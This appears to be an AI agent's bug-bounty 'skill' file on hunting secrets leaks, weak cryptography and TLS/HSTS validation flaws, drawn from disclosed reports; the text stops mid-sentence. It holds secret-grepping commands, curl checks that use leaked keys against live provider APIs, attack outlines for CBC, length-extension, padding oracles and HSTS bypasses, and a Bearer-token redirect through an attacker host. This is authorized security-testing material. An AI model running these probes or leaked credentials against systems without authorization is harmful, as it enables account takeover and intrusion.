---
name: hunt-crypto
description: "Hunting skill for the CRYPTOGRAPHIC / TLS / secrets-management vulnerability class, built from 550 full disclosed reports (617 assigned). Covers secrets leaked in public JS/sourcemaps, APKs, GitHub repos and old commits, logs and config files; broken crypto (CBC cut-and-paste, MD5/length-extension, RSA-512, 1024-bit DH, weak RNG); TLS/cert validation failures (SecTrust mis-compare, OCSP staple bypass, expired certs, HSTS trailing-dot/IDN bypass, cleartext transmission); token/credential flow leaks (password-reset tokens sent to analytics, OAuth/magic-link tokens in deeplinks, netrc/digest/Bearer/mTLS credentials crossing origins); and client-side JWT secret generation. Use when the target ships client-side code or binaries, publishes repositories, exposes config/debug endpoints, handles tokens in URLs/redirects, or terminates TLS. This skill OWNS crypto/TLS/secrets triage; hunt-jwt-crypto owns JWT forgery mechanics, hunt-tls-network owns TLS/DNS hardening triage, hunt-ssrf owns metadata SSRF."
sources: hackerone_public, github_public_code_search, portswigger_research, curl_openssl_gnutls_secTrust_research
report_count: 617
full_reports_read: 550
---

# HUNT-CRYPTO — Cryptographic, TLS & Secrets-Management Failures

This skill is grounded in 550 full disclosed reports. The class is broad: it spans
hardcoded secrets, weak/broken algorithms, certificate-validation failures, and
credential/token leakage. The single most productive recurring theme across the
corpus is **secrets exposed in artifacts the attacker can already read** — public
JavaScript, sourcemaps, mobile binaries, GitHub repositories (especially old
commits), config files, and logs. The second is **transport/trust failures** —
certificates that are not validated, cleartext transmission, and HSTS bypasses.
The third is **cryptographic design errors** — CBC cut-and-paste, length
extension, undersized keys, and broken randomness.

Be opinionated about impact. Many items in this class are Info/Low hardening noise
(missing CAA, weak cipher *support* with no decrypt PoC, a self-signed cert on a
non-prod host). This skill tells you which findings actually pay and how to prove
them.

---

## Crown Jewel Targets

Priority targets, ordered by how often they produced a valid, paid finding in the
study corpus.

- **Public JavaScript bundles and sourcemaps** — the highest-frequency discovery
  surface (js-source-review 55, public-code-search 146). Look for API keys,
  secrets, and `jwt.sign(payload, SECRET)` compiled into client code. Stripo
  (`#983331`) leaked `aviaryApiKey` and `youtubeApiKey` in
  `main.c1965c58f39a0f4aadc3.js`; Trint (`#638635`) shipped a Zendesk JWT secret
  in `app.e984c9df.js` and its `.js.map`.

- **Public source repositories and old commits** — secrets in `.git` history survive
  rotation in current code. Rockset (`#1094151`), Ruby on Rails / Sauce Labs
  (`#1302395`), AWS VDP (`#3017105`), AppLovin/X (`#674774`), Rocket.Chat
  (`#766346`), Glovo and Shopify (`#1298809`) were all found via GitHub search,
  with several keys sitting in *old* commits.

- **Mobile binaries (APK/IPA) and embedded config** — decompiled apps leak keys in
  `res/values/strings.xml`, `AndroidManifest.xml`, `google-services.json`, or the
  binary itself. GlassWire (`#1641475`) exposed a Facebook App Secret and a working
  `client_credentials` token; Zenly (`#753868`), NordVPN (`#792850`), and Coinbase
  (`#5786`) leaked keys or skipped certificate verification entirely.

- **Cloud credential stores** — AWS Access Key + Secret Key in a public repo
  (`#3017105`) is Critical-tier because an attacker can act as the authenticated
  principal and incur charges. Any live cloud credential is a crown jewel.

- **Token-bearing URLs and redirect/deeplink flows** — magic links and OAuth
  callbacks that carry `token=`, `secret=`, `access_token=`, or an authorization
  code in a URL. Shopify Arrive (`#855618`) and Shop App (`#1700734`) leaked login
  tokens / Outlook auth codes through untrusted deeplinks; HackerOne Code
  (`#4000185`) forwarded a live 64-char password-reset token to Segment in page
  events before the form was submitted.

- **TLS trust/validation code paths in clients and libraries** — curl/OpenSSL,
  GnuTLS, and Apple SecTrust produced a dense cluster of 2025–2026 reports:
  SecTrust accepting untrusted certs (`#3374554`), OCSP staple/session-reuse
  bypasses (`#2341063`, `#4118610`, `#4122300`, `#4135826`), and cross-origin
  credential reuse (`#3749428`, `#3735180`, `#4125043`, `#3514263`).

- **Config, debug, and error endpoints** — `/config`, `queryconfig.action`,
  `info.php`, exposed `.git` directories, and debug logs. MTN (`#1397788`) leaked
  usernames, encrypted passwords and internal IPs via `queryconfig.action`; Omise
  (`#1662194`) logged a secret API key via `logger.debug`; DoD (`#765825`) leaked a
  Yubikey API password from an exposed `.git`.

- **SSL VPN / appliance endpoints and weak third-party crypto** — Pulse Secure SSL
  VPN (`#695005`, `#696276`, `#678496`), Telerik DialogHandler machine-key brute
  force (`#491668`), and Primefaces weak encryption (`#874924`) all chain crypto
  weakness directly to arbitrary file read or RCE.

Payouts are highest when a leaked secret is **live and privileged** (cloud keys,
app secrets that mint tokens), when a crypto flaw chains to **RCE or account
takeover**, or when a token leak crosses into **another user's session**.

---

## Attack Surface Signals

### URL / Endpoint Patterns to Hunt
```
/static/js/*.js            /static/js/*.js.map       /assets/*.js
/.git/config               /.git/HEAD                /info.php
/config                    /queryconfig.action       /docker-compose.yml
/.travis.yml               /google-services.json     /AndroidManifest.xml
/Redirect.aspx?EQ=         /redirect?u=...&t=...      /access/jwt?jwt=
/access/jwt?jwt=           /oauth/authorize?...       /external/redirector.phtml
*.app.link/...?token=      *.app.link/...?secret=     /session
/password/reset?token=     /api/waitlist/us           /rest/v1/users/...
```

### JS / Source Patterns (in client-side code and bundles)
```javascript
// Secrets compiled into the client
const { REACT_APP_ZENDESK_SECRET } = process.env;
const zendeskToken = jwt.sign(payload, REACT_APP_ZENDESK_SECRET);
aviaryApiKey: "..."
youtubeApiKey: "..."
api_key = "..."
password: "coolguy21"
logger.debug('Authorization: %s', self.api_key)

// Sourcemap references — fetch the .map, it often contains original source + secrets
//# sourceMappingURL=app.e984c9df.js.map
```

### GitHub / Repo Patterns
```
.travis.yml                 # Sauce Labs key "encoded, not encrypted" (#1302395)
google-services.json        # Fabric/Google services config (#766346)
AndroidManifest.xml         # Fabric API key, AppLovin SDK key (#674774)
*.pem, *.key, id_rsa        # private keys in repos (#1234531)
config.js / e2e/config      # plaintext password (#1188188)
old commits / PR diffs      # keys removed from HEAD but still in history (#1094151, #1302395)
```

### Response / Header / TLS Signals
```
Set-Cookie: remember_user_token=...        # single cookie gates user data (#49357)
Public-Key-Pins-Report-Only: ... pin-sha256="..."
Strict-Transport-Security: (missing / weak max-age)
Expired / invalid certificate; wrong SAN hostname
CSP whitelist containing a claimable third-party domain (gl-canary.freetls.fastly.net, #716677)
Cleartext email / SSO redirect: http://www.odnoklassniki.ru/oauth/authorize?...  (#703759)
```

### Tech Stack Signals
- **React/Next SPA with webpack sourcemaps** — secrets in `.js.map`.
- **Mobile app (APK/IPA)** — decompile, look in `res/values/` and the binary.
- **Organization with public GitHub repos** — `public-code-search` is the #2 signal.
- **Client TLS stacks** — curl, OpenSSL, GnuTLS, Apple SecTrust (OCSP, HSTS, cert validation).
- **SSO via JWT (Zendesk-style)** — secret may be generated client-side.
- **Analytics/telemetry on auth pages** — Segment, Mixpanel receiving URLs with tokens.
- **SSL VPN / Primefaces / Telerik** — known weak-crypto CVE chains.

---

## Discovery Patterns From 550 Full Reports

### Where Researchers Start (ranked recon surfaces from study pack frequency table)

The frequency table counts full reports containing each signal. These are the
surfaces researchers actually start from, ranked. For each, "what to look for"
is the concrete secret/crypto artifact.

1. **search-filter-sort (152)** — the single most common recon entry point.
   Search interfaces, filters, and sort parameters often reflect decrypted or
   encoded values, echo config, or expose tokens in result URLs. *What to look
   for:* encrypted URL parameters (`?EQ=`, `?u=...&t=...`), reflected ciphertext,
   error pages leaking internal detail.

2. **public-code-search (146)** — GitHub/GitLab search across the org and its
   developers. *What to look for:* `api_key`, `api_secret`, `client_secret`,
   `AWS_ACCESS_KEY_ID`, `password`, `JWT_SECRET`, private keys, cloud config,
   and similar strings in **old commits**, not just HEAD.

3. **session-attack (116)** — anything touching session state. *What to look for:*
   cookies that alone gate sensitive data (`remember_user_token`), sessions that
   survive uninstall/reinstall (`#238260`), interceptable session cookies
   (`#745324`).

4. **api-endpoint (102)** — REST/GraphQL endpoints. *What to look for:* API keys
   in responses, endpoints that accept a key/token and return data without
   authorization, PII behind weak object checks (`#902733`, `#2294930`).

5. **image-processing (96)** — image pipelines and CDN configs. *What to look for:*
   hardcoded image-editor keys (Stripo Aviary `#983331`), CSP allowlists pointing
   at claimable image domains (`#716677`).

6. **server-side-rendering (86)** — SSR, template rendering, screenshots.
   *What to look for:* secrets embedded in server-rendered templates or data used
   to build JWTs, tokens placed into rendered URLs.

7. **filter-bypass (86)** — WAF/validation bypasses. *What to look for:* weak ciphers
   or TLS checks that can be skirted, HSTS validation asymmetries
   (`#1753226`, `#1565622`, `#3733984`).

8. **internal-network (81)** — internal hosts and IPs. *What to look for:*
   internal IPs/password/config in error or config pages (`#1397788`), expired
   certs on internal/stage subdomains (`#220615`).

9. **cache-layer (78)** — caches and CDNs. *What to look for:* cached pages that
   include personal data or tokens, CSP-listed dangling domains (`#716677`).

10. **comment-injection (68)** — comment/data fields. *What to look for:*
    credential material pasted into public fields or disclosed reports
    (`#1047125` — unblurred keys in a *disclosed report*).

11. **redirect-handling (66)** — redirects and URL shorteners. *What to look for:*
    encrypted redirect parameters amenable to CBC cut-and-paste (`#126203`),
    cross-origin redirects that carry credentials (curl reports), OAuth
    `redirect_uri` and deeplink flows.

12. **sso-oauth (58)** — SSO/OAuth/OpenID flows. *What to look for:* JWT secrets
    generated client-side (`#638635`), authorization codes / access tokens in
    URLs or deeplinks (`#1700734`, `#2129769`), HTTP (not HTTPS) auth redirects
    (`#703759`).

13. **js-source-review (55)** — manual review of JS bundles. *What to look for:*
    API keys, tokens, secrets, sourcemaps, `jwt.sign(...)` with a key.

14. **proxy-feature (55)** — proxies and TLS-intercepting infra. *What to look for:*
    OCSP staple handling, cert trust-store overrides, PROXY-protocol identity
    confusion (`#3475613`).

15. **cookie-handling (52)** — cookie scope and lifetime. *What to look for:*
    cookies set for a parent domain after subdomain takeover, cookies that alone
    authorize data access (`#49357`), `Secure`/`HttpOnly` flags (`#1024880`).

16. **xml-parser (52)** — XML/config parsers and config files. *What to look for:*
    plaintext keys in XML (`#792850`), config files with live reset tokens
    forwarded to analytics (`#4000185`).

17. **blind-oob (45)** — blind out-of-band sinks. *What to look for:* tokens
    exfiltrated to attacker-reachable endpoints, analytics beacons carrying secrets.

18. **admin-internal (44)** — admin/internal panels. *What to look for:*
    credentials stored in OS credential managers (`#1874155`), internal config
    disclosure.

19. **stored (39)** — stored secrets/tokens. *What to look for:* keys and license
    keys sitting in plaintext files (`#1079630`, `#1188188`).

20. **debug-error-leak (37)** — debug logs and stack traces. *What to look for:*
    secrets in `logger.debug` calls (`#1662194`), tokens in page events
    (`#4000185`).

21. **misconfiguration (37)** — general misconfiguration. *What to look for:*
    missing/enforceable DNS controls (CAA `#129992`, `#410245`), misconfigured
    record permissions leaking PII (`#2294930`).

### Feature-Based Discovery Signals (frequency-ranked table)

| Signal (count) | Why it matters | What to probe |
|---|---|---|
| search-filter-sort (152) | Reflects or decrypts attacker-influenced values; leaks config in errors | Encrypted params (`?EQ=`), reflected ciphertext, crafted search filters |
| public-code-search (146) | Secrets in repos are world-readable and often unrevoked | `org:<name> api_key`, TruffleHog/gitleaks over full history |
| session-attack (116) | Session material is the authentication boundary | Cookie-only auth, reinstall/token persistence, cookie scope |
| api-endpoint (102) | Endpoints return keys/PII without authorization | Unauthenticated key checks, object ID enumeration |
| image-processing (96) | Image CDNs/keys are embedded and CSP-trusted | Aviary/SDK keys, CSP-listed dangling domains |
| server-side-rendering (86) | Templates/build data may embed secrets | Sourcemaps, rendered URL params, JWT generation inputs |
| filter-bypass (86) | Validation asymmetries enable TLS/HSTS bypass | Trailing-dot, IDN, encoded hosts |
| internal-network (81) | Internal hosts surface in errors/config | `queryconfig.action`, stage subdomains, expired certs |
| cache-layer (78) | Cached/CDN content may hold tokens | CSP allowlists, cached auth pages |
| comment-injection (68) | Disclosed reports/pastes leak unblurred secrets | Search disclosed reports for working keys (`#1047125`) |
| redirect-handling (66) | Redirects carry tokens and credentials across origins | CBC cut-and-paste, cross-origin credential reuse, deeplinks |
| sso-oauth (58) | SSO trust boundaries leak tokens/secrets | Client-side JWT signing, auth codes in URLs, HTTP auth redirects |
| js-source-review (55) | Bundles are readable by everyone | Grep `SECRET`, `apiKey`, `jwt.sign`, sourcemap fetch |
| proxy-feature (55) | Proxies terminate/reuse TLS and identity | OCSP staple validation, mTLS session reuse, PROXY header trust |
| cookie-handling (52) | Cookie scope/lifetime governs access | Parent-domain cookies, `Secure`/`HttpOnly`, takeover |
| xml-parser (52) | Config/XML files hold plaintext credentials | `strings.xml`, `google-services.json`, telemetry config |
| blind-oob (45) | Beacons can carry secrets to attacker endpoints | Analytics page events, reset-token URLs |
| admin-internal (44) | Internal panels and OS stores hold keys | Credential Manager, internal config pages |
| stored (39) | Long-lived secrets in files | License keys, plaintext config, `e2e/config` |
| debug-error-leak (37) | Debug logging reveals secrets | `logger.debug('Authorization: %s', ...)`, stack traces |
| misconfiguration (37) | Missing DNS/policy controls | CAA records, record permissions, HSTS headers |
| cloud-metadata (18) | Stage hosts on cloud with expired certs | `*.ec2-*.svc.*` subdomains, metadata reachability |
| path-traversal-lfi (18) | File read exposes crypto material | `data.mdb` credential stores, `/etc/passwd`, keys on disk |
| base64-encoding (16) | Encoding mistaken for encryption | Decode `.travis.yml` values, CBC params |
| redirect-handling / open-redirect (13) | Encrypted redirect params are malleable | CBC blocks, padding, length extension |
| jwt-token (2) | JWT secrets/signing done client-side | Sourcemap `jwt.sign` secret, forge other identities |
| subdomain-takeover (19) | CSP-trusted dangling domains are claimable | Fastly/Heroku/S3 fingerprints, canary claim |

### Verbatim Discovery Clues (18 real quotes from study pack)

1. `[#983331]` "I found a sensitive data including authentication key written in public accessible javascript file."
2. `[#1302395]` "I found an API key in an old copy of the Travis."
3. `[#1302395]` "I found the key using [TruffleHog](https://github."
4. `[#1094151]` "In this case I found a Rockset API key, This API key is not in the current code, but it is visible in an old commit."
5. `[#1094151]` "com/rest-api/ ) and I found this way to check if the API key is revoke or not"
6. `[#1047125]` "The API keys from Aviary and YouTube are disclosed in that report, and I tried using these API keys, and found out that they can still be used to fetch response from YouTube's API using Stripo's disclosed API key."
7. `[#674774]` "I found a Sensitive Data Exposure in github/mopub-android-mediation project, the AppLovin UI API key is hardcoded in source code."
8. `[#753868]` "==I found a bunch of API keys,Tokens."
9. `[#716292]` "While going through Github search I discovered a public repository which contains Jumbcloud API Key of Starbucks."
10. `[#396467]` "GitHub is a truly awesome service but it is unwise to put any sensitive data in code that is hosted on GitHub and similar services as i was able to find github token indexed ***7 hours Ago*** by user"
11. `[#1298809]` "While searching in github repos for sub-domains realted to ***Zendesk***, I found this a ***Shopify*** Sub domains"
12. `[#173251]` "I saw that the email is sent in clear-text instead of TLS (Transport Layer Security) any Man-in-the-middle attacker is able to read these sensitive Emails and get the password reset link which lead to account takeover."
13. `[#550937]` "I was able to find one selector \"my1\" which is using RSA 512 bits key."
14. `[#197253]` "During the decryption and the HMAC verification process the length of the padding is revealed."
15. `[#197253]` "While I am at it I may as well let you know that you also support 1024-bit Diffie-Hellman keys."
16. `[#76303]` "> i found that some of the cipher suites are weak on you domain."
17. `[#1344951]` "I've found this website with no valid SSL Certificate."
18. `[#213437]` "We found an issue in the JWE specification where it fails to warn the implementers about Invalid Curve attack."

### Probe Checklist (15 concrete probes)

1. **Fetch every JS bundle and its sourcemap**, grep for `SECRET`, `apiKey`,
   `api_key`, `client_secret`, `jwt.sign`, `REACT_APP_*` (Stripo/Trint pattern).
2. **GitHub org search** for `api_key`, `AWS_ACCESS_KEY`, `password`,
   `JWT_SECRET`, `client_secret`, `private_key`; run TruffleHog/gitleaks over
   full history (not just HEAD).
3. **Decompile the APK/IPA** and inspect `res/values/strings.xml`,
   `AndroidManifest.xml`, `google-services.json` for keys and tokens.
4. **Crawl config/debug surfaces**: `/.git`, `/config`, `/queryconfig.action`,
   `/info.php`, `docker-compose.yml`, `.travis.yml`, `e2e/config.js`.
5. **Test every discovered key for liveness/revocation** against the provider API
   (Rockset `GET /v1/orgs/self/users/self/apikeys`; Facebook `client_credentials`
   token call) — an unrevoked key from an old report is still a finding.
6. **Decode any JWT** (`eyJ...`) header/payload; check whether the secret or
   signing key is present in client code or the sourcemap.
7. **Verify TLS certificate validity**: expiry, chain, SAN hostname, issuer.
8. **Run `testssl.sh --fast` / `sslyze`** for weak ciphers, protocols, and
   known CVEs (POODLE, DROWN, SWEET32, Heartbleed).
9. **Probe HSTS enforcement** with trailing-dot, multi-dot, and IDN hostnames.
10. **Inspect password-reset / magic-link URLs** — is the token in the URL, and
    is the full URL forwarded to analytics (`context.page.search`,
    `properties.url`) on page load?
11. **Intercept OAuth/deeplink flows** for `access_token`, `secret=`, and
    authorization codes placed in untrusted app links.
12. **Test cross-origin redirect credential handling**: does `Authorization:`,
    Bearer, netrc, digest state, or an mTLS client cert survive a redirect to a
    different origin?
13. **Review debug logging** for secrets written in plaintext (`logger.debug`).
14. **Probe encrypted parameters** (`?EQ=`, `?u=&t=`) for CBC block malleability
    and hash length-extension.
15. **Enumerate CSP allowlists** for dangling/claimable third-party domains
    (subdomain takeover on a CSP-trusted host).

---

## Step-by-Step Hunting Methodology

### Phase A — Secrets Discovery (highest yield; do this first)

1. **Map all client-side artifacts.** Spider the app, download every `.js`
   bundle, and request the corresponding `.js.map` from the `sourceMappingURL`
   comment. Sourcemaps frequently contain the original source with env-var names
   and secrets intact (Trint `#638635`).

2. **Grep artifacts for secret patterns.** Use the payload commands below. Look
   for API keys, app secrets, cloud credentials, passwords, JWT secrets, and
   private-key blocks. EVERY string you find must be tested for liveness.

3. **Run public-code search across the whole org.** Search GitHub/GitLab for the
   company name, product names, and subdomains. Use TruffleHog/gitleaks on full
   history — old commits are a recurring goldmine (`#1094151`, `#1302395`,
   `#1298809`). Search disclosed bug-bounty reports too: `#1047125` found a key
   that the company forgot to blur when disclosing `#983331`.
   - Developers' personal repos count too: a key indexed "7 hours ago" by a
     Snap engineer was found in `#396467`, and a Shopify subdomain's
     `ZRT_API_KEY` / `JWT_SECRET` sat in a public repo in `#1298809`.
   - Treat every candidate as guilty until tested: `#1094151` validated the
     leaked Rockset key against the provider API before reporting.

4. **Decompile mobile apps.** For APKs use `apktool`/`jadx`; inspect
   `res/values/strings.xml`, `AndroidManifest.xml`, and native libraries. Test any
   found token against its provider (`#1641475` produced a working Facebook
   `client_credentials` token).

5. **Crawl config/debug/error endpoints.** Probe `/.git`, `/config`,
   `queryconfig.action`, `info.php`, `docker-compose.yml`, and debug logs. These
   routinely expose plaintext passwords, internal IPs, and API passwords
   (`#1397788`, `#1662194`, `#765825`).

6. **Validate and grade each secret.** Determine scope: what can the credential
   do, is it production, and is it still active? A live AWS key or cloud secret
   is Critical; a defunct image-editor key is Low. Never report an unverified
   string as a vulnerability.

### Phase B — Token & Credential Flow Analysis

7. **Trace authentication tokens end-to-end.** Follow the password-reset,
   magic-link, and OAuth callback flows. Record every URL that carries a token,
   `secret=`, `access_token=`, or authorization code. Check whether deeplinks
   are verifiable (`assetlinks.json`) — empty assetlinks enabled interception in
   `#855618`.

8. **Check analytics/telemetry leakage.** On the reset-link page, watch for
   beacons to Segment/Mixpanel carrying the full URL with the unused token in
   `context.page.search` / `properties.url` (`#4000185`). This is a real account
   takeover primitive, not just an info leak.

9. **Test redirect credential handling.** Using curl/Burp, check whether
   `Authorization` headers, Bearer tokens, netrc credentials, digest auth state,
   or mTLS client certificates persist across cross-origin redirects — a prolific
   curl/OpenSSL bug family (`#3514263`, `#3680038`, `#3749428`, `#3735180`,
   `#4125043`).

### Phase C — Cryptographic Weakness Analysis

10. **Identify cipher modes and key sizes.** For encrypted URL parameters
    (`?EQ=`, `?u=&t=`), fingerprint the mode and block size (Uber `#126203`
    identified CBC, block size 8). Look for MD5/short HMAC signatures
    (`#32944`), RSA-512 selectors (`#550937`), 1024-bit DH (`#197253`), and
    reduced-permutation RNGs (`#852841`).

11. **Attempt classical attacks where the oracle exists.** CBC cut-and-paste to
    redirect to an arbitrary URL (`#126203`); hash length extension (Zomato
    `#251572`, WP-API `#32944`); padding-length oracle in HMAC verification
    (`#197253`); invalid-curve attack against JWE (`#213437`). For third-party
    components, use known weak-crypto-to-RCE chains: Telerik machine-key brute
    force (`#491668`) and Primefaces weak encryption (`#874924`).

### Phase D — TLS / Certificate Validation

12. **Audit certificate validity.** Check expiry (stage hosts commonly expire —
    `#220615`), chain, SAN hostname, and whether the client validates at all
    (Coinbase `#5786` had no cert verification). Check SecTrust/OpenSSL/GnuTLS
    trust-store handling (`#3374554`, `#4123304`).

13. **Test revocation and HSTS bypasses.** Try OCSP staple tricks (missing
    `nextUpdate`, session reuse — `#2341063`, `#4135826`) and HSTS bypass via
    trailing dot, multi-dot, or IDN (`#1565622`, `#1753226`, `#3733984`). Check
    whether email/auth flows are cleartext (`#173251`, `#703759`).

14. **Check certificate-authorization and subdomain trust.** Missing CAA
    (`#129992`, `#410245`) is recon intel only, not a report. But a CSP-trusted
    dangling domain (`#716677`) is a real takeover: claim it and serve a canary.

### Phase E — Validate & Report

15. **Apply Gate 0** (below), write a reproduction that proves the secret/token
    is live or the crypto flaw is exploitable, and grade severity conservatively.

---

## Payload & Detection Patterns

### Secret Discovery — grep / tooling

```bash
# Grep JS bundles, sourcemaps, and config trees for secrets
grep -rEin "(api[_-]?key|api[_-]?secret|client[_-]?secret|aws_access_key|jwt[_-]?secret|password|token|private[_-]?key)" \
  --include="*.js" --include="*.js.map" --include="*.json" --include="*.xml" --include="*.yml" .

# Fetch a sourcemap referenced by a bundle
curl -s https://target/static/js/app.e984c9df.js | grep sourceMappingURL
curl -s https://target/static/js/app.e984c9df.js.map -o app.js.map

# GitHub / history secret scanning (recurs into old commits)
trufflehog git https://github.com/org/repo.git --only-verified
gitleaks detect --source . --log-opts="--all"

# Exposed repo/config surfaces
for p in /.git/config /.git/HEAD /info.php /config /queryconfig.action /docker-compose.yml /google-services.json; do
  echo "$p -> $(curl -s -o /dev/null -w '%{http_code}' https://target$p)"
done
```

### Verified Liveness Checks (from real reports)

```bash
# Rockset — check whether a leaked API key still works (report #1094151)
curl --request GET \
  --url https://api.rs2.usw2.rockset.com/v1/orgs/self/users/self/apikeys \
  -H 'Authorization: ApiKey <LEAKED_KEY>'

# Facebook App Secret -> working app access token (report #1641475)
curl "https://graph.facebook.com/oauth/access_token?client_id=<ID>&client_secret=<SECRET>&redirect_uri=&grant_type=client_credentials"
# -> {"access_token":"...","token_type":"bearer"}

# Sauce Labs — "encoded, not encrypted" key decoded from .travis.yml (report #1302395)
curl https://rubyonrails:<DECODED_KEY>@saucelabs.com/rest/v1/users/rubyonrails
```

### JWT / Client-Side Signing Detection

```bash
# Decode a JWT header/payload (do NOT hand-encode base64)
# Header: eyJ...  ->  {"alg":"RS256","typ":"JWT"}
# Look in sourcemaps for the signing secret:
grep -Ein "jwt\.sign\(|ZENDESK_SECRET|REACT_APP_.*SECRET" app.js.map
# Trint #638635: jwt.sign(payload, REACT_APP_ZENDESK_SECRET) shipped to the client
```

### Crypto Weakness Payloads / Concepts

```
# CBC cut-and-paste on an encrypted redirect (Uber #126203)
?EQ=<ciphertext>   # identified as CBC, block size 8
# Swap/reorder ciphertext blocks to change the decrypted destination URL
# Known-plaintext: access a self-controlled URL that encrypts itself, then splice

# Hash length extension (Zomato #251572, WP-API #32944)
# Given MD5(secret || data) and data, append attacker data without the secret
# WP-API Key-Auth used MD5 of JSON args -> suggested hash_hmac('sha256', ..., $secret)

# Padding oracle in HMAC verification (report #197253)
# Decryption + HMAC verify reveals padding length -> decrypt/forge

# Weak primitives to flag
RSA 512-bit key (selector "my1")   #550937
1024-bit Diffie-Hellman            #197253
MD5 signatures                     #32944
Reduced-permutation RNG            #852841
Invalid-curve attack on JWE        #213437
# Component chains:
Telerik DialogHandler machine key brute force -> DNN webshell -> RCE  #491668
Primefaces weak encryption (CVE-2017-1000486) -> RCE                  #874924
Pulse Secure path traversal -> /data/runtime/mtmp/lmdb/data.mdb (cleartext creds) -> RCE  #678496
```

### TLS / Certificate / HSTS Probes

```bash
# Certificate validity, expiry, SAN, issuer
echo | openssl s_client -connect target:443 -servername target 2>/dev/null | \
  openssl x509 -noout -dates -subject -issuer -ext subjectAltName

# Weak ciphers / protocols / known CVEs — support != exploitable
testssl.sh --fast target 2>/dev/null | grep -E "CRITICAL|HIGH|MEDIUM|POODLE|DROWN|SWEET32|heartbleed"
openssl s_client -connect target:443 -tls1 2>/dev/null | grep -E "Protocol|Cipher"

# HSTS bypass candidates (curl/OpenSSL families)
curl -sI https://target/ | grep -i strict-transport-security
curl -sI http://target./          # trailing dot (#1565622)
curl -sI http://target../         # multi trailing dot (#3733984)
# IDN/punycode variants bypass HSTS (#1753226)

# Cross-origin credential leak checks
curl -L -H 'Authorization: Bearer <token>' https://attacker-redirect/target
curl -L --netrc --digest https://hostA/redirect-to-hostB   # #3680038
```

### Token-in-Analytics / Redirect Detection

```
# On a real password-reset page, inspect outbound beacons for:
context.page.search      properties.search
context.page.url         properties.url
# If the full URL (with ?token=...) appears, the unused reset token is leaked (#4000185)

# Magic-link / OAuth deeplinks:
https://<rand>.app.link/...?token=<T>&secret=<S>   # #855618
https://.../oauth/authorize?...&redirect_uri=...    # #1700734, #703759 (http!)
# Check attacker-controlled redirect_uri and assetlinks.json
```

### Source-Code Grep Patterns

```bash
grep -rE "(jwt\.sign|logger\.debug\('Authorization|REACT_APP_.*SECRET|apiKey:|client_secret)" src/
grep -rE "(MD5|md5\(|RSA|DH|1024|512)" crypto/ --include="*.py" --include="*.js" --include="*.php"
```

---

## Common Root Causes

1. **Secrets compiled into client-side code.** API keys and app secrets are
   embedded in JS bundles/sourcemaps (`#983331`, `#638635`) or mobile binaries
   (`#1641475`, `#792850`, `#753868`). Anything shipped to the client is public.

2. **Secrets in public repositories and history.** Developers commit keys, then
   sometimes remove them from HEAD but not from git history (`#1094151`,
   `#1302395`, `#3017105`, `#1298809`). "Encoded, not encrypted" values are
   plaintext (`#1302395`).

3. **Secrets in logs, config files, and error pages.** Debug logging of an
   `Authorization` header (`#1662194`), config endpoints exposing internal IPs
   and encrypted passwords (`#1397788`), exposed `.git` with an API password
   (`#765825`), plaintext passwords in `e2e/config.js` (`#1188188`).

4. **Failure to revoke discovered keys.** A key disclosed in a public report was
   still usable (`#1047125`), and a leaked Rockset key was validated against the
   provider API (`#1094151`). Rotation/revocation is often missing.

5. **Broken block-cipher and hash usage.** CBC cut-and-paste on a redirect
   parameter (`#126203`), MD5-based signatures vulnerable to length extension
   (`#32944`, `#251572`), and padding-length oracles during HMAC verification
   (`#197253`).

6. **Undersized keys and weak randomness.** RSA-512 (`#550937`), 1024-bit DH
   (`#197253`), weak primefaces/Telerik crypto (`#874924`, `#491668`), and
   reduced-permutation RNG output (`#852841`).

7. **Improper certificate validation.** SecTrust legacy-path type confusion
   accepting untrusted certs (`#3374554`), mobile apps with no cert verification
   at all (`#5786`), and cert-trust-store overrides ignored (`#4123304`).

8. **Weak or bypassable revocation.** OCSP staples with no `nextUpdate`
   (`#4135826`), session-reuse bypass (`#2341063`), OCSP staple acceptance
   (`#4118610`, `#4122300`).

9. **Cleartext transmission and HSTS asymmetries.** Email/reset links over HTTP
   (`#173251`), SSO redirected to `http://` (`#703759`), and HSTS normalization
   bugs with trailing dots/IDN (`#1565622`, `#1753226`, `#3733984`).

10. **Token leakage through URLs, deeplinks, and analytics.** Login tokens in
    unverifiable app links (`#855618`), OAuth codes in deeplinks (`#1700734`),
    live reset tokens sent to Segment (`#4000185`), and `access_token` exposed in
    URLs callable directly from the CLI (`#2129769`).

11. **Cross-origin credential/state persistence.** curl/OpenSSL reusing Bearer
    tokens, netrc, digest state, or mTLS client certs across origins
    (`#3514263`, `#3680038`, `#3749428`, `#3735180`, `#4125043`).

12. **Client-side JWT/SSO trust.** Signing an SSO (Zendesk) JWT in browser code
    means the secret is public and any identity can be forged (`#638635`).

13. **Session material not protected or cleared.** Sessions surviving uninstall
    (`#238260`), a single cookie gating user data (`#49357`), and leaked session
    cookies (`#745324`).

14. **Exposed cloud metadata on stage hosts / missing DNS controls.** Expired
    certs on cloud stage subdomains (`#220615`), missing CAA (`#129992`,
    `#410245`), misconfigured record permissions exposing PII (`#2294930`).

---

## Bypass Techniques

### Secret-Discovery Bypasses
- **Old commits and PR diffs** — when HEAD is clean, scan full history
  (`#1094151`, `#1302395`). GitHub search indexes old code and developers' repos.
- **Sourcemaps** — minified bundles may look clean, but the `.js.map` reveals
  original source with secrets and env-var names (`#638635`).
- **Disclosed reports** — companies sometimes forget to redact keys in disclosed
  reports; those keys may still be live (`#1047125`).
- **Encoding-is-not-encryption** — decode base64/encoded config values before
  concluding they are safe (`#1302395` Sauce Labs key).

### Crypto Bypasses
- **CBC cut-and-paste** — exploit block reordering on encrypted URL params to
  change decrypted content without knowing the key; use a self-encrypting URL as
  a known-plaintext oracle (`#126203`).
- **Length extension** — append data to `MD5(secret || data)` without the secret
  when the app uses plain hashes instead of HMAC (`#32944`, `#251572`).
- **Padding oracle** — use revealed padding length in the decrypt-then-verify
  path to decrypt/forge (`#197253`).
- **Invalid-curve attack** — exploit JWE implementations that do not validate the
  EC point (`#213437`).
- **Machine-key brute force** — for Telerik/Primefaces, detect key length from
  base64 validation behavior, then brute-force to a webshell/RCE
  (`#491668`, `#874924`).

### TLS / Cert / HSTS Bypasses
- **Trailing dot / multi-dot** — HSTS layer strips one dot before lookup while
  the URL/peer layer keeps every dot, so `http://target../` goes plaintext
  (`#1565622`, `#3733984`).
- **IDN/punycode** — Unicode hostname variants bypass HSTS matching
  (`#1753226`).
- **OCSP staple tricks** — a staple with no `nextUpdate` is accepted regardless
  of age (`#4135826`); TLS session reuse skips OCSP verification (`#2341063`).
- **Trust-store confusion** — legacy SecTrust path mis-compares OSStatus and
